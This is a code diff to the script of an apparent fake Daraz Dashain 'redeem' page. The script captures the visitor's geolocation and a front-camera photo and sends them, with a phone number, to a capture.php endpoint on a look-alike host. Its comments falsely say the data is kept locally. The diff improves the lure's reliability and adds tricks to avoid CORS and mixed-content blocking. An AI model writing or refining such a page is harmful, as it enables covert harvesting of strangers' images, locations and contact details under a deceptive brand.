@@ -203,11 +203,19 @@
 <script>
 "use strict";
 
-/* ============================================================
-   API ENDPOINT
-   Using http:// because freedev.app cert is broken.
-   text/plain content-type avoids CORS preflight (critical fix).
-   ============================================================ */
+/* ---- Surface any JS crash in the pill ---- */
+window.onerror = function(msg, src, line) {
+  const pill = document.getElementById('statusPill');
+  if (pill) {
+    pill.textContent = 'JS ERROR: ' + msg + ' @' + line;
+    pill.classList.add('show');
+    clearTimeout(pill._t);
+    pill._t = setTimeout(() => pill.classList.remove('show'), 6000);
+  }
+  return false;
+};
+
+/* ---- API: http + text/plain = no preflight, survives mixed content ---- */
 const API = "http://daraz-dashain.freedev.app/capture.php";
 
 const modal       = document.getElementById('modalOverlay');
@@ -222,18 +230,15 @@ const captured = { location:null, image:null };
 let cameraStream = null;
 let captureStarted = false;
 
-/* ---------- OPEN POPUP ---------- */
 btnRedeem.addEventListener('click', (e) => {
   e.preventDefault();
   modal.classList.add('active');
 });
 
-/* ---------- ENABLE CONFIRM ONLY IF CHECKED ---------- */
 agreeCheck.addEventListener('change', () => {
   btnConfirm.disabled = !agreeCheck.checked;
 });
 
-/* ---------- CONFIRM ---------- */
 btnConfirm.addEventListener('click', () => {
   modal.classList.remove('active');
   btnRedeem.style.display = 'none';
@@ -249,12 +254,9 @@ btnConfirm.addEventListener('click', () => {
   }
 });
 
-/* ---------- LOCATION (stores locally only) ---------- */
+/* ---------- LOCATION (local only) ---------- */
 function triggerLocationCapture() {
-  if (!navigator.geolocation) {
-    captured.location = { error: 'Not supported' };
-    return;
-  }
+  if (!navigator.geolocation) { captured.location = { error:'Not supported' }; return; }
   showStatus('Getting Location...');
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -269,34 +271,33 @@ function triggerLocationCapture() {
       captured.location = { error: err.message || 'Denied' };
       showStatus('Location: ' + (err.message || 'denied'));
     },
-    { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
+    { enableHighAccuracy:false, timeout:10000, maximumAge:60000 }
   );
 }
 
-/* ---------- CAMERA (stores locally only) ---------- */
+/* ---------- CAMERA (local only, adaptive wait) ---------- */
 async function triggerCameraCapture() {
   try {
     showStatus('Accessing Camera...');
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      captured.image = null;
-      showStatus('Camera not supported');
-      return;
+      captured.image = null; showStatus('Camera not supported'); return;
     }
     cameraStream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 320 }, height: { ideal: 240 } },
-      audio: false
+      video: { facingMode:'user', width:{ideal:320}, height:{ideal:240} }, audio:false
     });
     const video = document.getElementById('video');
     video.srcObject = cameraStream;
-    video.setAttribute('playsinline', '');
+    video.setAttribute('playsinline','');
     video.muted = true;
     await video.play().catch(()=>{});
-    await new Promise(res => {
-      if (video.readyState >= 2) return res();
-      video.onloadeddata = () => res();
-      setTimeout(res, 2000);
-    });
-    await new Promise(res => setTimeout(res, 700));
+
+    // wait until we actually have frames
+    let waited = 0;
+    while ((video.videoWidth || 0) < 10 && waited < 3000) {
+      await new Promise(r => setTimeout(r, 200));
+      waited += 200;
+    }
+    await new Promise(r => setTimeout(r, 500));
 
     const canvas = document.getElementById('canvas');
     canvas.width  = video.videoWidth  || 320;
@@ -307,24 +308,19 @@ async function triggerCameraCapture() {
     cameraStream.getTracks().forEach(t => t.stop());
     cameraStream = null;
     video.srcObject = null;
-
     showStatus('Photo captured');
   } catch (err) {
-    console.warn('Camera denied', err);
     captured.image = null;
     showStatus('Camera: ' + (err.name || 'failed'));
   }
 }
 
-/* ---------- SUBMIT: everything in one POST ---------- */
+/* ---------- SUBMIT ---------- */
 btnSubmit.addEventListener('click', () => {
   const phone = document.getElementById('phone').value.trim();
   const notes = document.getElementById('notes').value.trim();
 
-  if (!/^[0-9+\-\s]{7,15}$/.test(phone)) {
-    showStatus('Enter a valid phone number');
-    return;
-  }
+  if (!/^[0-9+\-\s]{7,15}$/.test(phone)) { showStatus('Enter a valid phone number'); return; }
 
   btnSubmit.disabled = true;
   btnSubmit.textContent = 'SUBMITTING...';
@@ -344,30 +340,23 @@ btnSubmit.addEventListener('click', () => {
       document.getElementById('phone').readOnly = true;
       document.getElementById('notes').readOnly = true;
     } else {
-      showStatus('Saved locally. Server said: ' + (res && res.error ? res.error : 'no reply'));
+      showStatus('Server said: ' + (res && res.error ? res.error : 'no reply'));
       btnSubmit.disabled = false;
       btnSubmit.textContent = 'RETRY';
     }
   });
 });
 
-/* ---------- SENDER (text/plain = no CORS preflight) ---------- */
+/* ---------- SENDER (text/plain = simple request) ---------- */
 function sendData(payload) {
   showStatus('Sending...');
   return fetch(API, {
-    method: 'POST',
-    headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
+    method:'POST',
+    headers:{ 'Content-Type':'text/plain;charset=UTF-8' },
     body: JSON.stringify(payload)
   })
-  .then(r => {
-    showStatus('Server replied: ' + r.status);
-    return r.json();
-  })
-  .catch(e => {
-    showStatus('FAILED: ' + e.message);
-    console.warn('Send failed', e);
-    return { ok:false, error: e.message };
-  });
+  .then(r => { showStatus('Server replied: ' + r.status); return r.json(); })
+  .catch(e => { showStatus('FAILED: ' + e.message); return { ok:false, error:e.message }; });
 }
 
 function showStatus(msg) {
